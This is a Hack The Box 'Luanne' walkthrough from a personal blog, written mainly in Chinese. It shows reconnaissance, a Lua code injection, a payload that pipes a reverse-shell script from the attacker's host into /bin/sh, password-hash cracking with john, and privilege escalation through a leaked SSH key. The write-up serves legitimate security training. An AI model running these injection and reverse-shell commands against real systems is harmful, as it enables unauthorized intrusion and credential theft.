<html><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="ie=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><link rel=icon href=/images/favicon.svg><link rel=stylesheet href=/scss/global.min.31644eb0a4807354e83d642e00d1629426acd319847fa6cb553690cd76457acd.css><link rel=stylesheet href=/css/prism.css><link href="https://fonts.googleapis.com/css?family=Merriweather&display=swap" rel=stylesheet><title>[HTB] Luanne Writeup | Ice1187's Blog</title><meta name=description content="Recon  nmap  ice1187@ubuntu:~/htb/luanne$ nmap -sC -sV -o nmap/nmap.out 10.10.10.218 Starting Nmap 7.80 ( https://nmap.org ) at 2021-04-06 22:42 CST Nmap scan report for 10.10.10.218 Host is up (0.079s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.0 (NetBSD 20190418-hpn13v14-lpk; protocol 2.0) | ssh-hostkey: | 3072 20:97:7f:6c:4a:6e:5d:20:cf:fd:a3:aa:a9:0d:37:db (RSA) | 521 35:c3:29:e1:87:70:6d:73:74:b2:a9:a2:04:a9:66:69 (ECDSA) |_ 256 b3:bd:31:6d:cc:22:6b:18:ed:27:66:b4:a7:2a:e4:a5 (ED25519) 80/tcp open http nginx 1.19.0 | http-auth: | HTTP/1."><meta property="og:title" content="[HTB] Luanne Writeup | Ice1187's Blog"><meta property="og:site_name" content="Ice1187's Blog"><meta property="og:description" content="Recon  nmap  ice1187@ubuntu:~/htb/luanne$ nmap -sC -sV -o nmap/nmap.out 10.10.10.218 Starting Nmap 7.80 ( https://nmap.org ) at 2021-04-06 22:42 CST Nmap scan report for 10.10.10.218 Host is up (0.079s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.0 (NetBSD 20190418-hpn13v14-lpk; protocol 2.0) | ssh-hostkey: | 3072 20:97:7f:6c:4a:6e:5d:20:cf:fd:a3:aa:a9:0d:37:db (RSA) | 521 35:c3:29:e1:87:70:6d:73:74:b2:a9:a2:04:a9:66:69 (ECDSA) |_ 256 b3:bd:31:6d:cc:22:6b:18:ed:27:66:b4:a7:2a:e4:a5 (ED25519) 80/tcp open http nginx 1.19.0 | http-auth: | HTTP/1."><meta property="og:url" content="https://ice1187.github.io/post/2021-04-06-htb-luanne-writeup/"><meta property="og:type" content="website"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://ice1187.github.io/post/htb-luanne-writeup/luanne.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="[HTB] Luanne Writeup | Ice1187's Blog"><link rel=canonical href=https://ice1187.github.io/post/2021-04-06-htb-luanne-writeup/><meta name=twitter:site content="@https://twitter.com/ice1187"><meta name=twitter:creator content="@https://twitter.com/ice1187"><meta name=twitter:description content="Recon  nmap  ice1187@ubuntu:~/htb/luanne$ nmap -sC -sV -o nmap/nmap.out 10.10.10.218 Starting Nmap 7.80 ( https://nmap.org ) at 2021-04-06 22:42 CST Nmap scan report for 10.10.10.218 Host is up (0.079s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.0 (NetBSD 20190418-hpn13v14-lpk; protocol 2.0) | ssh-hostkey: | 3072 20:97:7f:6c:4a:6e:5d:20:cf:fd:a3:aa:a9:0d:37:db (RSA) | 521 35:c3:29:e1:87:70:6d:73:74:b2:a9:a2:04:a9:66:69 (ECDSA) |_ 256 b3:bd:31:6d:cc:22:6b:18:ed:27:66:b4:a7:2a:e4:a5 (ED25519) 80/tcp open http nginx 1.19.0 | http-auth: | HTTP/1."><meta name=twitter:image content="https://ice1187.github.io/post/htb-luanne-writeup/luanne.png"><meta property="article:published_time" content="2021-04-06T23:54:18+08:00"><meta property="article:updated_time" content="2021-04-06T23:54:18+08:00"></head><body class=line-numbers><script src=/js/initColors.js></script><div class=layout-styled><section class=section><div class=nav-container><a class=logo-link href=/><div id=logo-desktop class=logo-font>Ice1187's Blog</div><div id=logo-mobile class="hidden logo-font">Ice1187's Blog</div><span class=header-hidden>Navigate back to the homepage</span></a><div class=nav-controls><button id=copyButton class=icon-wrapper><svg class="icon-image" width="24" height="20" viewBox="0 0 24 20" fill="none" xmlns="http://www.w3.org/2000/svg"><path fillRule="evenodd" clipRule="evenodd" d="M2 5C2 3.34328 3.34328 2 5 2h9c1.6567.0 3 1.34328 3 3V9c0 1.6567-1.3433 3-3 3H10C9.44771 12 9 12.4477 9 13S9.44771 14 10 14h4c2.7613.0 5-2.2387 5-5V5c0-2.76128-2.2387-5-5-5H5C2.23872.0.0 2.23872.0 5V9c0 1.4938.656313 2.8361 1.6935 3.7509C2.10768 13.1163 2.73961 13.0767 3.10494 12.6625 3.47028 12.2483 3.43068 11.6164 3.0165 11.2511 2.39169 10.6999 2 9.89621 2 9V5zm5 6c0-1.65672 1.34328-3 3-3h4C14.5523 8 15 7.55228 15 7S14.5523 6 14 6H10C7.23872 6 5 8.23872 5 11v4c0 2.7613 2.23872 5 5 5h9c2.7613.0 5-2.2387 5-5V11C24 9.50621 23.3437 8.16393 22.3065 7.24906 21.8923 6.88372 21.2604 6.92332 20.8951 7.3375 20.5297 7.75168 20.5693 8.38361 20.9835 8.74894 21.6083 9.30007 22 10.1038 22 11v4c0 1.6567-1.3433 3-3 3H10c-1.65672.0-3-1.3433-3-3V11z" fill="#000"/></svg><div id=toolTip class=tool-tip>copied</div><input id=copyText style=opacity:0 type=text class=tool-tip></button>
<button id=themeColorButton class=icon-wrapper><div id=sunRays class=sun-rays></div><div id=moonOrSun class=moon-or-sun></div><div id=moonMask class=moon-mask></div></button></div></div></section><script src=/js/toggleLogos.js></script><script src=/js/toggleColors.js></script><script src=/js/copyUrl.js></script><section class="section narrow"><section id=articleHero class="section narrow"><div class=article-hero><header class=article-header><h1 class=article-hero-heading>[HTB] Luanne Writeup</h1><div class=article-hero-subtitle><div class=article-meta><a href=/authors/ice1187/ class=article-author-link><div class=article-author-avatar><img src=/images/avatar-ice1187.png></div><strong>Ice1187</strong>
<span class=hide-on-mobile>,&nbsp;</span></a>
<script src=/js/collapseAuthors.js></script>April 6, 2021
• 5 min read</div></div></header><div class=article-hero-image id=ArticleImage__Hero><img src=/post/htb-luanne-writeup/luanne.png></div></div></section><script src=/js/adjustHeroImagePosition.js></script><aside id=progressBar class=aside-container><div class=aside-align><div><div class=overlap-container></div></div></div><div class=progress-container tabindex={-1}><div class=track-line aria-hidden=true><div id=progressIndicator class=progress-line></div></div></div></aside><article id=articleContent class=post-content style=position:relative><h2 id=recon>Recon</h2><ul><li>nmap</li></ul><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>ice1187@ubuntu:~/htb/luanne$ nmap -sC -sV -o nmap/nmap.out 10.10.10.218
Starting Nmap 7.80 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2021-04-06 22:42 CST
Nmap scan report <span style=color:#66d9ef>for</span> 10.10.10.218
Host is up <span style=color:#f92672>(</span>0.079s latency<span style=color:#f92672>)</span>.
Not shown: <span style=color:#ae81ff>997</span> closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.0 <span style=color:#f92672>(</span>NetBSD 20190418-hpn13v14-lpk; protocol 2.0<span style=color:#f92672>)</span>
| ssh-hostkey:
|   <span style=color:#ae81ff>3072</span> 20:97:7f:6c:4a:6e:5d:20:cf:fd:a3:aa:a9:0d:37:db <span style=color:#f92672>(</span>RSA<span style=color:#f92672>)</span>
|   <span style=color:#ae81ff>521</span> 35:c3:29:e1:87:70:6d:73:74:b2:a9:a2:04:a9:66:69 <span style=color:#f92672>(</span>ECDSA<span style=color:#f92672>)</span>
|_  <span style=color:#ae81ff>256</span> b3:bd:31:6d:cc:22:6b:18:ed:27:66:b4:a7:2a:e4:a5 <span style=color:#f92672>(</span>ED25519<span style=color:#f92672>)</span>
80/tcp   open  http    nginx 1.19.0
| http-auth:
| HTTP/1.1 <span style=color:#ae81ff>401</span> Unauthorized<span style=color:#ae81ff>\x</span>0D
|_  Basic realm<span style=color:#f92672>=</span>.
| http-robots.txt: <span style=color:#ae81ff>1</span> disallowed entry
|_/weather
|_http-server-header: nginx/1.19.0
|_http-title: <span style=color:#ae81ff>401</span> Unauthorized
9001/tcp open  http    Medusa httpd 1.12 <span style=color:#f92672>(</span>Supervisor process manager<span style=color:#f92672>)</span>
| http-auth:
| HTTP/1.1 <span style=color:#ae81ff>401</span> Unauthorized<span style=color:#ae81ff>\x</span>0D
|_  Basic realm<span style=color:#f92672>=</span>default
|_http-server-header: Medusa/1.12
|_http-title: Error response
Service Info: OS: NetBSD; CPE: cpe:/o:netbsd:netbsd
</code></pre></div><h3 id=80-unauthorized-webpage>80: Unauthorized Webpage</h3><p>連上發現網站需要登入。Escape 登入的 prompt 後，網頁提示了 localhost 有開 3000 port，但現在不是在 localhost，所以自然連不上。<br>沒有辦法登入，3000 port 也沒有開，這邊暫時應該是就這樣了。</p><p><img src=/post/htb-luanne-writeup/login.png alt=login>
<img src=/post/htb-luanne-writeup/escape.png alt=escape></p><p>接下來檢查 <code>robots.txt</code>，有一個 <code>/weather</code> 頁面，打開來顯示 <code>404 Not Found</code>，但註解表示「but still harvesting cities」，所以可 能有什麼東西。</p><p><img src=/post/htb-luanne-writeup/robots.png alt=robots></p><p>用 <code>gobuster</code> 爆一下，發現有一個 <code>/forecast</code> 網頁。</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>ice1187@ubuntu:~/htb/luanne$ gobuster dir -u 10.10.10.218/weather -w ../tools/SecLists/Discovery/Web-Content/raft-small-words.txt -o gobuster/gobuster.out
<span style=color:#f92672>===============================================================</span>
Gobuster v3.1.0
by OJ Reeves <span style=color:#f92672>(</span>@TheColonial<span style=color:#f92672>)</span> &amp; Christian Mehlmauer <span style=color:#f92672>(</span>@firefart<span style=color:#f92672>)</span>
<span style=color:#f92672>===============================================================</span>
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Url:                     http://10.10.10.218/weather
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Method:                  GET
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Threads:                 <span style=color:#ae81ff>10</span>
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Wordlist:                ../tools/SecLists/Discovery/Web-Content/raft-small-words.txt
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Negative Status codes:   <span style=color:#ae81ff>404</span>
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> User Agent:              gobuster/3.1.0
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Timeout:                 10s
<span style=color:#f92672>===============================================================</span>
2021/04/06 23:30:40 Starting gobuster in directory enumeration mode
<span style=color:#f92672>===============================================================</span>
/forecast             <span style=color:#f92672>(</span>Status: 200<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 90<span style=color:#f92672>]</span>

<span style=color:#f92672>===============================================================</span>
2021/04/06 23:36:32 Finished
<span style=color:#f92672>===============================================================</span>
</code></pre></div><p><code>/forecast</code> 網頁需要給一個 <code>city</code> 參數，會回傳該城市接下來五天的天氣預報資訊，給 <code>city=list</code> 會列出所有城市名稱。
手動測試一下之後發現，給單引號 <code>city='</code> 時，會出現錯誤。錯誤資訊中提示了兩點：</p><ol><li>參數是 Lua language 處理的</li><li>可能可以做 Injection</li></ol><p><img src=/post/htb-luanne-writeup/lua_error.png alt=lua_error></p><p>稍微再戳一下，發現應該沒有其他頁面或輸入了，就先停在這邊。</p><p><strong>Summary</strong></p><ol><li>需要登入</li><li><code>locahost:3000</code> 有跑東西</li><li><strong><code>/forecast/?city=</code> 可能有 injection</strong></li></ol><h3 id=9001-medusa-httpd-112-supervisor-process-manager>9001: Medusa httpd 1.12 (Supervisor process manager)</h3><p>從 nmap 的資訊可以看到 <code>Supervisor process manager</code>（或 <code>Medusa httpd 1.12</code>）應該是個 Application 之類的，嘗試 google 一下之後 可以就可以找到預設的帳號/密碼。</p><ul><li>Goolge: <code>Supervisor process manager default password</code> -> <a href=http://supervisord.org/configuration.html#unix-http-server-section-example>Configuration File</a></li><li>Google: <code>medusa 1.12 default password</code> -> <a href=https://readthedocs.org/projects/supervisor/downloads/pdf/latest/>supervisor Documentation</a></li></ul><p><img src=/post/htb-luanne-writeup/supervisor_webpage.png alt=supervisor_webpage></p><p>登入之後，網站裡可以查看系統的 memory、processes、uptime 資訊，其中也顯示了之前的 <code>localhost:3000</code> 以及新發現的 <code>:3001</code> 都跑著 <code>weather</code>、都是用 <code>lua</code> 語言，但兩者的參數不太一樣。<br>比較值得注意的是，<code>localhost:3001</code> 的參數裡顯示<strong>有一個 <code>r.michaels</code> 的 user</strong>。</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>_httpd     <span style=color:#ae81ff>10190</span>  0.0  0.0  <span style=color:#ae81ff>35256</span>  <span style=color:#ae81ff>2316</span> ?     I     8:30AM 0:00.00 /usr/libexec/httpd -u -X -s -i 127.0.0.1 -I <span style=color:#ae81ff>3000</span> -L weather /usr/local/webapi/weather.lua -U _httpd -b /var/www
r.michaels   <span style=color:#ae81ff>185</span>  0.0  0.0  <span style=color:#ae81ff>34992</span>  <span style=color:#ae81ff>2024</span> ?     Is    5:01AM 0:00.00 /usr/libexec/httpd -u -X -s -i 127.0.0.1 -I <span style=color:#ae81ff>3001</span> -L weather /home/r.michaels/devel/webapi/weather.lua -P /var/run/httpd_devel.pid -U r.michaels -b /home/r.michaels/devel/www
</code></pre></div><p><img src=/post/htb-luanne-writeup/processes.png alt=processes></p><p>戳了一下之後，發現這個網站沒有什麼地方可以輸入，http 帶的參數也都是定義好的 <code>/?processname=[memory|process|uptime]</code>。<br>重點 vulnerability 應該就是前面 <code>/forecast</code> 可能有 injection。</p><p><strong>Summary</strong></p><ol><li>預設帳密 <code>user:123</code></li><li><code>localhost:3000</code>、<code>:3001</code> 有跑 <code>/weather</code></li><li><strong>User: <code>r.michaels</code></strong></li></ol><h2 id=exploitation>Exploitation</h2><h3 id=exploit-injection-vulnerability>Exploit Injection Vulnerability</h3><p>回到 <code>/weather/forecast/</code>。傳入單引號會發生錯誤，合理推測應該是閉合了一個字串，因此後面的程式碼可能長得大概像這樣：</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-lua data-lang=lua>get_forecast(<span style=color:#e6db74>&#39;&lt;input&gt;&#39;</span>)
</code></pre></div><p>嘗試之後發現可以在閉合之後再次串接字串，所以有 code injection。</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>ice1187@ubuntu:~/htb/luanne$ curl 10.10.10.218/weather/forecast -X GET -d <span style=color:#e6db74>&#34;city=&#39;--&#34;</span>
&lt;br&gt;Lua error: /usr/local/webapi/weather.lua:49: attempt to call a nil value
ice1187@ubuntu:~/htb/luanne$ curl 10.10.10.218/weather/forecast -X GET -d <span style=color:#e6db74>&#34;city=&#39;--[[&#34;</span>
&lt;br&gt;Lua error: /usr/local/webapi/weather.lua:49: attempt to call a nil value
ice1187@ubuntu:~/htb/luanne$ curl 10.10.10.218/weather/forecast -X GET -d <span style=color:#e6db74>&#34;city=&#39;..&#39;list&#34;</span>
<span style=color:#f92672>{</span><span style=color:#e6db74>&#34;code&#34;</span>: 500,<span style=color:#e6db74>&#34;error&#34;</span>: <span style=color:#e6db74>&#34;unknown city: list&#34;</span><span style=color:#f92672>}</span>
</code></pre></div><p>最後用 <code>')--</code> 成功跳脫語句，可以開始做 reverse shell 了。</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>ice1187@ubuntu:~/htb/luanne$ curl 10.10.10.218/weather/forecast -X GET -d <span style=color:#e6db74>&#34;city=&#39;)--&#34;</span>
<span style=color:#f92672>{</span><span style=color:#e6db74>&#34;code&#34;</span>: 500,<span style=color:#e6db74>&#34;error&#34;</span>: <span style=color:#e6db74>&#34;unknown city: 
</span></code></pre></div><h3 id=create-reverse-shell>Create Reverse Shell</h3><p>嘗試最常見的 bash reverse shell 發現不行之後，我先用 <code>whereis</code> 發現有 <code>perl</code> 可以用，然後改用 <a href=https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#perl>Cheatsheet 上的 Perl revershell</a> 成功拿到 shell。<br></p><p><img src=/post/htb-luanne-writeup/whereis_perl.png alt=whereis_perl></p><p>Get Shell 的步驟如下：</p><ul><li>把 reverse shell 的 script 複製到 <code>./rev.sh</code>（記得改 ip 跟 port），然後開 python 的 http server。這裡的目的是讓 command 到 server 上去執行，就不用煩惱指令裡有一堆引號要 escape。</li></ul><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>ice1187@ubuntu:~/htb/luanne$ vim rev.sh  <span style=color:#75715e># copy script to ./rev.sh</span>
ice1187@ubuntu:~/htb/luanne$ python3 -m http.server
Serving HTTP on 0.0.0.0 port <span style=color:#ae81ff>8000</span> <span style=color:#f92672>(</span>http://0.0.0.0:8000/<span style=color:#f92672>)</span> ...
</code></pre></div><ul><li><code>nc</code> listen 等 reverse shell 回來。</li></ul><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>ice1187@ubuntu:~/htb/luanne$ nc -lvnp <span style=color:#ae81ff>13337</span>
Listening on 0.0.0.0 <span style=color:#ae81ff>13337</span>
</code></pre></div><ul><li>在 server 上用 <code>curl</code> 把 <code>./rev.sh</code> 的指令抓下來（可以省去需要 escape 各種引號的麻煩），再 pipe 到 <code>/bin/sh</code> 執行。</li></ul><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>ice1187@ubuntu:~/htb/luanne$ curl 10.10.10.218/weather/forecast -X GET -d <span style=color:#e6db74>&#34;city=&#39;);os.execute(&#39;curl 10.10.14.34:8000/rev.sh | /bin/sh&#39;);--&#34;</span>
</code></pre></div><ul><li>成功 get shell！</li></ul><p><img src=/post/htb-luanne-writeup/get_shell.png alt=get_shell></p><ul><li>(Optional) 用 python <a href=https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#spawn-tty-shell>spawn a TTY shell</a>，比較順手好用。</li></ul><h2 id=internal-access>Internal Access</h2><h3 id=found-webapi_user-credential>Found <code>webapi_user</code> Credential</h3><p>進來之後，同一個目錄底下就有 <code>webapi_user</code> 帳號的 hash。</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ ls -al
total <span style=color:#ae81ff>20</span>
drwxr-xr-x   <span style=color:#ae81ff>2</span> root  wheel  <span style=color:#ae81ff>512</span> Nov <span style=color:#ae81ff>25</span> 11:27 .
drwxr-xr-x  <span style=color:#ae81ff>24</span> root  wheel  <span style=color:#ae81ff>512</span> Nov <span style=color:#ae81ff>24</span> 09:55 ..
-rw-r--r--   <span style=color:#ae81ff>1</span> root  wheel   <span style=color:#ae81ff>47</span> Sep <span style=color:#ae81ff>16</span>  <span style=color:#ae81ff>2020</span> .htpasswd
-rw-r--r--   <span style=color:#ae81ff>1</span> root  wheel  <span style=color:#ae81ff>388</span> Apr  <span style=color:#ae81ff>7</span> 14:54 index.html
-rw-r--r--   <span style=color:#ae81ff>1</span> root  wheel   <span style=color:#ae81ff>78</span> Nov <span style=color:#ae81ff>25</span> 11:38 robots.txt
$ cat .htpasswd
webapi_user:$1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0
</code></pre></div><p>用 <code>john</code> crack 一下，就可以找出密碼 <code>iamthebest</code>。</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>ice1187@ubuntu:~/htb/luanne$ john --wordlist<span style=color:#f92672>=</span>../tools/Hob0Rules/wordlists/rockyou.txt pass.txt
Loaded <span style=color:#ae81ff>1</span> password hash <span style=color:#f92672>(</span>md5crypt <span style=color:#f92672>[</span>MD5 32/64 X2<span style=color:#f92672>])</span>
No password hashes left to crack <span style=color:#f92672>(</span>see FAQ<span style=color:#f92672>)</span>
ice1187@ubuntu:~/htb/luanne$ john --show pass.txt
webapi_user:iamthebest

<span style=color:#ae81ff>1</span> password hash cracked, <span style=color:#ae81ff>0</span> left
</code></pre></div><p>這組 credential 可以用來登入 80 port，但裡面就是列出 <code>/weather/forecast</code> 網頁的資訊而已，沒有其他特別的地方。而 <code>ssh</code> 沒有，因此目前好像沒什麼用。</p><h3 id=run-linpeas>Run LinPEAS</h3><p>接下來就直接跑 <a href=https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS>linePEAS</a>。比較有趣的內容主要是：</p><ol><li><code>r.michaels</code> 有 root 權限</li><li><code>r.michaels</code> 執行在 <code>127.0.0.1:3001</code> 上的 weather。</li></ol><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#75715e># my ubuntu</span>
ice1187@ubuntu:~/htb/luanne$ cp ../tools/privilege-escalation-awesome-scripts-suite/linPEAS/linpeas.sh .
ice1187@ubuntu:~/htb/luanne$ python3 -m http.server
Serving HTTP on 0.0.0.0 port <span style=color:#ae81ff>8000</span> <span style=color:#f92672>(</span>http://0.0.0.0:8000/<span style=color:#f92672>)</span> ...

<span style=color:#75715e># reverse shell</span>
$ curl 10.10.14.34:8000/linpeas.sh | /bin/sh
....<span style=color:#f92672>(</span>removed<span style=color:#f92672>)</span>....

_httpd      <span style=color:#ae81ff>336</span>  0.0  0.2 <span style=color:#ae81ff>121280</span> <span style=color:#ae81ff>11988</span> ?     Ss    5:05AM 0:01.28 /usr/pkg/bin/python3.8 /usr/pkg/bin/supervisord-3.8
r.michaels  <span style=color:#ae81ff>185</span>  0.0  0.0  <span style=color:#ae81ff>34996</span>  <span style=color:#ae81ff>1976</span> ?     Is    5:05AM 0:00.00 /usr/libexec/httpd -u -X -s -i 127.0.0.1 -I <span style=color:#ae81ff>3001</span> -L weather /home/r.michaels/devel/w
ebapi/weather.lua -P /var/run/httpd_devel.pid -U r.michaels -b /home/r.michaels/devel/www

<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Checking doas.conf
permit r.michaels as root
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Superusers
root:*:0:0:Charlie &amp;:/root:/bin/sh
toor:*:0:0:Bourne-again Superuser:/root:/bin/sh  <span style=color:#75715e># toor 是 NetBSD 上的預設帳號</span>

<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Users with console
r.michaels:*:1000:100::/home/r.michaels:/bin/ksh
root:*:0:0:Charlie &amp;:/root:/bin/sh
toor:*:0:0:Bourne-again Superuser:/root:/bin/sh
</code></pre></div><h3 id=targeting-on-3001-port>Targeting on 3001 port</h3><p>嘗試一下發現 3001 port 上的 <code>city</code> 參數應該沒有 injection 了。</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ curl -u webapi_user:iamthebest <span style=color:#e6db74>&#34;127.0.0.1:3001/weather/forecast/?city=&#39;);--&#34;</span>
<span style=color:#f92672>{</span><span style=color:#e6db74>&#34;code&#34;</span>: 500,<span style=color:#e6db74>&#34;error&#34;</span>: <span style=color:#e6db74>&#34;unknown city: &#39;);--&#34;</span><span style=color:#f92672>}</span>
</code></pre></div><p>回頭檢查看看 3001 port 上 <a href=https://man.netbsd.org/NetBSD-9.0/httpd.8><code>httpd</code> 的參數</a>，發現<strong>可以 access <code>r.michaels</code> 的目錄</strong>：</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>/usr/libexec/httpd -u -X -s -i 127.0.0.1 -I <span style=color:#ae81ff>3001</span> -L weather /home/r.michaels/devel/webapi/weather.lua -P /var/run/httpd_devel.pid -U r.michaels -b /home/r.michaels/devel/www
</code></pre></div><ul><li><strong><code>-u</code>: Enables the transformation of Uniform Resource Locators</strong> of the form <code>/~user/</code> into the directory <code>~user/public_html</code></li><li><code>-X</code>: Enables directory indexing.</li><li><code>-s</code>: Forces logging to be set to stderr always.</li><li><code>-i address</code>: Causes address to be used as the address to bind daemon mode.</li><li><code>-I port</code>: Use port instead of the default http&rsquo;port.</li><li><code>-L prefix script</code>: Adds a new Lua script for a particular prefix.</li><li><code>-P pidfile</code>: Create a PID file in pidfile when run in daemon mode with the <code>-b</code> option.</li><li><code>-U username</code>: Switch to the user and the groups of username after initialization.</li><li><code>-b</code>: Enables daemon mode.</li></ul><p>因為有開 <code>-X</code> (directory indexing)，嘗試之後就能找到並列出 <code>r.michaels/</code> 的目錄：</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ curl -u webapi_user:iamthebest localhost:3001/~r.michaels/
&lt;!DOCTYPE html&gt;
&lt;html&gt;&lt;head&gt;&lt;meta charset<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;utf-8&#34;</span>/&gt;
&lt;style type<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;text/css&#34;</span>&gt;
table <span style=color:#f92672>{</span>
        border-top: 1px solid black;
        border-bottom: 1px solid black;
<span style=color:#f92672>}</span>
th <span style=color:#f92672>{</span> background: aquamarine; <span style=color:#f92672>}</span>
tr:nth-child<span style=color:#f92672>(</span>even<span style=color:#f92672>)</span> <span style=color:#f92672>{</span> background: lavender; <span style=color:#f92672>}</span>
&lt;/style&gt;
&lt;title&gt;Index of ~r.michaels/&lt;/title&gt;&lt;/head&gt;
&lt;body&gt;&lt;h1&gt;Index of ~r.michaels/&lt;/h1&gt;
&lt;table cols<span style=color:#f92672>=</span>3&gt;
&lt;thead&gt;
&lt;tr&gt;&lt;th&gt;Name&lt;th&gt;Last modified&lt;th align<span style=color:#f92672>=</span>right&gt;Size
&lt;tbody&gt;
&lt;tr&gt;&lt;td&gt;&lt;a href<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;../&#34;</span>&gt;Parent Directory&lt;/a&gt;&lt;td&gt;16-Sep-2020 18:20&lt;td align<span style=color:#f92672>=</span>right&gt;1kB
&lt;tr&gt;&lt;td&gt;&lt;a href<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;id_rsa&#34;</span>&gt;id_rsa&lt;/a&gt;&lt;td&gt;16-Sep-2020 16:52&lt;td align<span style=color:#f92672>=</span>right&gt;3kB
&lt;/table&gt;
&lt;/body&gt;&lt;/html&gt;
</code></pre></div><h3 id=found-private-key--own-rmichaels-user>Found Private Key & Own <code>r.michaels</code> user</h3><p>在 <code>r.michaels/</code> 的目錄底下有 pirvate key（<code>id_rsa</code>），所以把 private key 複製下來、用 ssh 登入，就 own user 了。</p><p><img src=/post/htb-luanne-writeup/user_own.png alt=user_own></p><h2 id=own-root>Own Root</h2><p>列出 <code>r.michaels</code> 的家目錄，翻找一下就發現 <code>backup/</code> 裡面有個被加密的檔案，且 <code>.gnupg</code> 裡面也有東西（我猜 PGP 的 key 是存在這裡？），所以就解密出來看看。<br>搜尋一下就可以找到 NetBSD 上的 PGP 工具：<a href=https://man.netbsd.org/netpgp.1>netpgp</a></p><p><img src=/post/htb-luanne-writeup/decrypt_backup.png alt=decrypt_backup></p><p><code>tar.gz</code> 解開，<code>www/</code> 下也有一個 <code>.htpasswd</code>，裡面包含了 <code>webapi_user</code> 和另一組 hash。一樣可以用 <code>john</code> 爆出密碼。</p><p><img src=/post/htb-luanne-writeup/root_crack.png alt=root_crack></p><p>嘗試之後發現，這組密碼就是 root 的密碼，因此就 own root 了。</p><p><img src=/post/htb-luanne-writeup/own_root.png alt=own_root></p></article><section id=articleNext class="section nartrow"><h3 class=footer-next-heading>More articles from Ice1187's Blog</h3><div class=footer-spacer></div><div class=next-articles-grid numberofarticles={numberOfArticles}><div class=post-row><a href=/post/2021-04-06-testing-regex/ class=article-link id=article-link-bigger><div><div class=image-container><img src=/images/default-cat.jpg class=article-image></div><div><h2 class=article-title>Testing Regex</h2><p class=article-excerpt></p><div class=article-metadata>April 6, 2021 · 1 min read</div></div></div></a><a href=/post/2021-04-05-hello-world/ class=article-link><div><div class=image-container><img src=/images/default-cat.jpg class=article-image></div><div><h2 class=article-title>Hello World</h2><p class=article-excerpt>Just hello, and a cat.</p><div class=article-metadata>April 5, 2021 · 1 min read</div></div></div></a></div></div></section></section><script src=/js/progressBar.js></script><div class=footer-gradient></div><div class="section narrow"><div class=footer-hr></div><div class=footer-container><div class=footer-text>© 2021 Ice1187's Blog</div><div class=social-icon-outer><div class=social-icon-container><a href=mailto:hcc001202@gmail.com><svg class="social-icon-image" width="18" height="14" viewBox="0 0 48 36" fill="none" xmlns="http://www.w3.org/2000/svg"><path fillRule="evenodd" clipRule="evenodd" d="M43 0H5A5 5 0 000 5V31a5 5 0 005 5H43a5 5 0 005-5V5A5 5 0 0043 0zM41.13 9.65 28 18.7a7.07 7.07.0 